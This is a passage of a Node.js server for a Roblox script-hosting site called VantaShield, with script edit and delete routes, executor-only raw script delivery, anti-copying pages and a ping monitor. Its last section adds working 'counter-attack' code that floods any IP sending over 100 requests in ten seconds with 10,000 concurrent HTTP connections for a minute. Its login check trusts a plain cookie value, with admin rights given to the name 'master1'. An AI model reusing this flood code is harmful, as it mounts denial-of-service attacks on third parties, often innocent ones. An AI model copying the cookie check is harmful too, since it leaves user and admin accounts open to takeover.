    if (!scriptData) return res.status(404).send("File not found.");
    res.setHeader('Content-disposition', `attachment; filename=vantashield_${scriptData.fileName || id}.lua`);
    res.setHeader('Content-type', 'text/plain; charset=utf-8');
    res.send(scriptData.code);
});

app.get('/edit/:id', (req, res) => {
    const user = getCookie(req, 'user_session');
    const isAdmin = user === 'master1';
    const id = req.params.id;
    const scriptData = db.get(id);

    if (!scriptData || (!isAdmin && scriptData.owner !== user)) {
        return res.send("Invalid permissions or script missing.");
    }

    const rawCreatorName = scriptData.owner === 'guest_anonymous' ? 'anonymous' : scriptData.owner;
    const safeFileName = scriptData.fileName || id;
    
    const host = req.get('host');
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const rawLink = `${protocol}://${host}/${rawCreatorName}/${safeFileName}/refs/heads/main/${safeFileName}`;
    const loadstringCommand = `loadstring(game:HttpGet("${rawLink}"))()`;

    res.send(baseHTML(`
        <section class="hero"><h1><span class="line2">EDIT SCRIPT [${id}]</span></h1></section>
        <div class="center-card-wrap">
            <div class="quick-card">
                <div class="result-box" style="margin-top: 0; margin-bottom: 25px;">
                    <div style="font-size: 11px; color: var(--vs-white); margin-bottom: 5px; font-weight: bold; font-family: 'Orbitron';"><i class="ph ph-terminal-window"></i> LOADSTRING COMMAND:</div>
                    <button type="button" class="copy-btn" onclick="copyText('loadstring-text-edit', this)"><i class="ph ph-copy"></i> COPY</button>
                    <div class="code-preview" id="loadstring-text-edit" style="color: #fff;">${loadstringCommand}</div>
                </div>
                <form action="/edit/${id}" method="POST">
                    <div style="background: rgba(255,255,255,0.02); padding: 15px; border-radius: 8px; border: 1px solid var(--vs-border); margin-bottom: 20px;">
                        <div class="field-label"><i class="ph ph-upload-simple"></i> METHOD 1: UPLOAD NEW FILE</div>
                        <p style="font-size: 12px; color: var(--vs-text); margin: 5px 0 10px 0;">Click below to overwrite current code with a local file.</p>
                        <label class="btn-upload" style="background: var(--vs-white); color: var(--vs-black); border: none;">
                            <i class="ph ph-folder-open" style="font-size:16px;"></i> SELECT FILE...
                            <input type="file" accept=".lua,.txt,.luau,.js" onchange="handleFileUpload(event)">
                        </label>
                    </div>
                    <div class="field-label" style="margin-top: 20px;"><i class="ph ph-keyboard"></i> METHOD 2: DIRECT EDIT</div>
                    <textarea id="codeArea" name="code" required>${escapeHTML(scriptData.code)}</textarea>
                    <button type="submit" class="btn-save"><i class="ph ph-floppy-disk"></i> SAVE CHANGES TO SERVER</button>
                </form>
            </div>
        </div>
    `, user));
});

app.post('/edit/:id', (req, res) => {
    const user = getCookie(req, 'user_session');
    const isAdmin = user === 'master1';
    const id = req.params.id;
    const scriptData = db.get(id);

    if (scriptData && (isAdmin || scriptData.owner === user)) {
        scriptData.code = req.body.code;
        db.set(id, scriptData);
        saveDb();
    }
    res.redirect('/dashboard');
});

app.get('/delete/:id', (req, res) => {
    const user = getCookie(req, 'user_session');
    const isAdmin = user === 'master1';
    const id = req.params.id;
    const scriptData = db.get(id);

    if (scriptData && (isAdmin || scriptData.owner === user)) {
        db.delete(id);
        saveDb();
    }
    res.redirect('/dashboard');
});

// Điều khoản sử dụng dịch vụ
app.get('/tos', (req, res) => {
    const user = getCookie(req, 'user_session');
    res.send(baseHTML(`
        <section class="hero">
            <div class="hero-badge"><i class="ph ph-gavel"></i> LEGAL & COMPLIANCE</div>
            <h1><span class="line2">TERMS OF SERVICE</span></h1>
        </section>
        <div class="center-card-wrap" style="max-width: 800px;">
            <div class="quick-card">
                <div class="cyber-text-alert" style="justify-content:center; margin-bottom: 20px;"><i class="ph-fill ph-clock-counter-clockwise"></i> LAST UPDATED: 2026</div>
                <div class="tos-list">
                    <div class="tos-item">
                        <div class="tos-title"><span>01 //</span> Redistribution</div>
                        <div class="tos-desc">You are not permitted to redistribute scripts without explicit permission.</div>
                    </div>
                    <div class="tos-item">
                        <div class="tos-title"><span>02 //</span> Acceptable Use</div>
                        <div class="tos-desc">You must not use this service for malicious purposes.</div>
                    </div>
                    <div class="tos-item">
                        <div class="tos-title"><span>03 //</span> Ownership</div>
                        <div class="tos-desc">All code snippets remain the sole property of their respective creators.</div>
                    </div>
                </div>
            </div>
        </div>
    `, user));
});

// ============================================================================
// HỆ THỐNG TRUY XUẤT RAW SCRIPT & ANTI-SKID BẢO MẬT TUYỆT ĐỐI
// ============================================================================

// Định dạng tệp tin giả lập Github: /creatorName/fileName/refs/heads/main/fileName
app.all('/:creatorName/:fileName/refs/heads/main/:fileName2', (req, res) => {
    const { creatorName, fileName } = req.params;
    
    let data = null;
    for (const [key, val] of db.entries()) {
        const valCreator = val.owner === 'guest_anonymous' ? 'anonymous' : val.owner;
        if ((val.fileName === fileName || key === fileName) && valCreator === creatorName) {
            data = val;
            break;
        }
    }

    // CHỈ CÓ EXECUTOR GAME ĐƯỢC PHÉP ĐỌC SCRIPT GỐC
    if (isRobloxExecutor(req)) {
        if (!data) return res.status(404).send('print("VantaShield: Script Not Found")');
        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
        return res.send(data.code);
    }

    // ĐỐI VỚI TRÌNH DUYỆT THƯỜNG TRUY CẬP -> BẮT BUỘC RA MÀN HÌNH TROLL BÁO ĐỘNG (SKID ALERT)
    if (!data) {
        return res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head><meta charset="UTF-8"><title>404 NOT FOUND</title>${style}</head>
            <body>
                <div class="troll-screen">
                    <div class="troll-text">SKID ALERT !</div>
                    <div class="troll-sub">Code does not exist or has been nuked =)</div>
                </div>
                <script>setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);</script>
            </body>
            </html>
        `);
    }

    return res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head><meta charset="UTF-8"><title>SKID DETECTED !!!</title>${style}</head>
        <body>
            <div class="troll-screen">
                <div class="troll-text">SKID ALERT !</div>
                <div class="troll-sub">Get out! Stealing source code is strictly prohibited by VantaShield.</div>
            </div>
            <script>setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);</script>
        </body>
        </html>
    `);
});

// Cơ chế tương thích API v1 cũ
app.all('/v1/:id', (req, res) => {
    const id = req.params.id;
    const data = db.get(id);

    if (isRobloxExecutor(req)) {
        if (!data) return res.status(404).send('print("VantaShield: Script Not Found")');
        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
        return res.send(data.code);
    }

    if (!data) {
        return res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head><meta charset="UTF-8"><title>404 NOT FOUND</title>${style}</head>
            <body>
                <div class="troll-screen">
                    <div class="troll-text">SKID ALERT !</div>
                    <div class="troll-sub">Code does not exist or has been nuked =)</div>
                </div>
                <script>setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);</script>
            </body>
            </html>
        `);
    }

    return res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head><meta charset="UTF-8"><title>SKID DETECTED !!!</title>${style}</head>
        <body>
            <div class="troll-screen">
                <div class="troll-text">SKID ALERT !</div>
                <div class="troll-sub">Get out! Stealing source code is strictly prohibited by VantaShield.</div>
            </div>
            <script>setTimeout(() => { window.location.href = "https://www.google.com"; }, 3000);</script>
        </body>
        </html>
    `);
});


// ============================================================================
// GIÁM SÁT PING (Ping Monitor)
// ============================================================================
app.get('/ping', (req,res) => {
  const user = getSessionUser(req);
  if (!user) return res.redirect('/login?error=Cần đăng nhập để dùng Ping Monitor.');
  const mine = [];
  pingDb.forEach((v,k) => { if (v.owner === user) mine.push({ id:k, ...v }); });
  const rows = mine.map(m => {
    const status = m.lastOk ? 'ONLINE' : (m.lastCheck ? 'DOWN' : 'PENDING');
    const color = m.lastOk ? 'var(--vs-white)' : (m.lastCheck ? '#ef4444' : 'var(--vs-text)');
    const uptime = m.totalPings ? Math.round((m.successCount||0)/m.totalPings*100) : 0;
    return `<tr>
      <td style="color:var(--vs-white); font-family:'JetBrains Mono'; max-width:280px; overflow:hidden; text-overflow:ellipsis;">${escapeHTML(m.url)}</td>
      <td><span style="color:${color}; font-weight:bold;">${status} ${m.lastStatus?('('+m.lastStatus+')'):''}</span></td>
      <td>${m.lastTime||0}ms</td>
      <td>${uptime}% (${m.successCount||0}/${m.totalPings||0})</td>
      <td>${m.lastCheck? new Date(m.lastCheck).toLocaleTimeString() : '-'}</td>
      <td>
        <form action="/ping/delete/${m.id}" method="POST" style="display:inline;"><button class="btn-action btn-delete"><i class="ph ph-trash"></i> XÓA</button></form>
      </td>
    </tr>`;
  }).join('');
  const count = mine.length;

  res.send(baseHTML(`
    <section class="hero">
      <div class="hero-badge"><i class="ph ph-pulse"></i> UPTIME MONITOR</div>
      <h1><span class="line2">PING MONITOR</span></h1>
      <p style="color:var(--vs-text);">Tự động ping mỗi 10 giây · ${count}/${PING_LIMIT_PER_USER} web đang theo dõi</p>
    </section>
    <div class="center-card-wrap" style="max-width:1000px;">
      <div class="quick-card">
        <form action="/ping/add" method="POST">
          <label class="field-label"><i class="ph ph-link"></i> URL CẦN PING</label>
          <input type="text" name="url" placeholder="https://example.com" required>
          <button type="submit" class="btn-save"><i class="ph ph-plus-circle"></i> THÊM VÀO PING (còn ${PING_LIMIT_PER_USER-count} chỗ)</button>
        </form>
      </div>
      <div class="quick-card" style="margin-top:20px;">
        <div class="field-label" style="margin-bottom:15px;"><i class="ph ph-list-checks"></i> DANH SÁCH URL</div>
        <div class="manage-wrap">
          <table class="manage-table">
            <thead><tr><th>URL</th><th>STATUS</th><th>THỜI GIAN</th><th>UPTIME</th><th>PING GẦN NHẤT</th><th>HÀNH ĐỘNG</th></tr></thead>
            <tbody>${rows || '<tr><td colspan="6" style="text-align:center; color:var(--vs-text); padding:20px;">Chưa có URL nào. Thêm URL để bắt đầu ping tự động.</td></tr>'}</tbody>
          </table>
        </div>
        <p style="color:var(--vs-text); font-size:12px; margin-top:15px;"><i class="ph ph-info"></i> Trang tự làm mới sau mỗi 10 giây.</p>
      </div>
    </div>
    <script>setTimeout(()=>location.reload(), 10000);</script>
  `, user));
});

app.post('/ping/add', (req,res) => {
  const user = getSessionUser(req);
  if (!user) return res.redirect('/login');
  let url = (req.body.url||'').trim();
  if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
  try { new URL(url); } catch(e){ return res.redirect('/ping'); }
  const mineCount = Array.from(pingDb.values()).filter(v => v.owner === user).length;
  if (mineCount >= PING_LIMIT_PER_USER) return res.redirect('/ping');
  const id = crypto.randomBytes(4).toString('hex');
  pingDb.set(id, { owner: user, url, createdAt: Date.now(), totalPings:0, successCount:0 });
  savePing();
  res.redirect('/ping');
});

app.post('/ping/delete/:id', (req,res) => {
  const user = getSessionUser(req);
  const entry = pingDb.get(req.params.id);
  if (entry && (entry.owner === user || user === 'master1')) { pingDb.delete(req.params.id); savePing(); }
  res.redirect('/ping');
});


// ============================================================================
// ADDED: DDoS COUNTER-ATTACK SYSTEM (Auto-flood attacker IP when threshold exceeded)
// ============================================================================
const DDOS_THRESHOLD = 100;                // Number of requests from one IP in window to trigger counter-attack
const DDOS_WINDOW_MS = 10 * 1000;          // 10 seconds sliding window
const FLOOD_CONCURRENCY = 10000;           // Simultaneous outbound connections for flood
const FLOOD_DURATION_SEC = 60;             // How long the flood lasts (seconds)
const FLOOD_TARGET_PORT = 80;              // Default target port (use 443 for HTTPS if needed)

const requestCounts = new Map();           // IP -> array of timestamps
const floodActive = new Set();             // IPs currently being flooded (to prevent duplicate triggers)

// Middleware to track incoming request rates per IP
app.use((req, res, next) => {
  const ip = req.ip || req.connection.remoteAddress || '127.0.0.1';
  if (!requestCounts.has(ip)) requestCounts.set(ip, []);
  const timestamps = requestCounts.get(ip);
  const now = Date.now();
  timestamps.push(now);

  // Clean timestamps outside the window
  const fresh = timestamps.filter(t => now - t < DDOS_WINDOW_MS);
  requestCounts.set(ip, fresh);

  // If threshold crossed and not already flooding, start counter-flood
  if (fresh.length >= DDOS_THRESHOLD && !floodActive.has(ip)) {
    floodActive.add(ip);
    // Launch the flood asynchronously (do not block the request)
    counterFlood(ip).finally(() => {
      floodActive.delete(ip);
      requestCounts.set(ip, []); // Reset counter after flood ends
    });
  }
  next();
});

/**
 * Massive asynchronous HTTP flood targeting the attacker's IP.
 * Keeps up to FLOOD_CONCURRENCY requests in flight for FLOOD_DURATION_SEC seconds.
 */
function counterFlood(attackerIp) {
  return new Promise((resolve) => {
    const agent = new http.Agent({ maxSockets: FLOOD_CONCURRENCY, keepAlive: true });
    const endTime = Date.now() + FLOOD_DURATION_SEC * 1000;
    const options = {
      hostname: attackerIp,
      port: FLOOD_TARGET_PORT,
      path: '/',
      method: 'GET',
      agent: agent
    };

    // Each worker sends one request, then schedules the next request immediately after completion
    const worker = () => {
      if (Date.now() > endTime) return; // stop when duration expires
      const req = http.request(options, (res) => {
        res.resume(); // consume response data to free memory
      });
      req.on('error', () => {}); // ignore all connection errors
      req.end(() => {
        // Queue the next request without blocking the event loop
        setImmediate(worker);
      });
    };

    // Launch initial set of workers
    for (let i = 0; i < FLOOD_CONCURRENCY; i++) {
      setImmediate(worker);
    }

    // Resolve the promise after the flood duration to allow cleanup
    setTimeout(() => {
      agent.destroy(); // close all sockets
      resolve();
    }, FLOOD_DURATION_SEC * 1000);
  });
}


const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[VantaShield.com] Secure Server is running on Port: ${PORT}`);
});
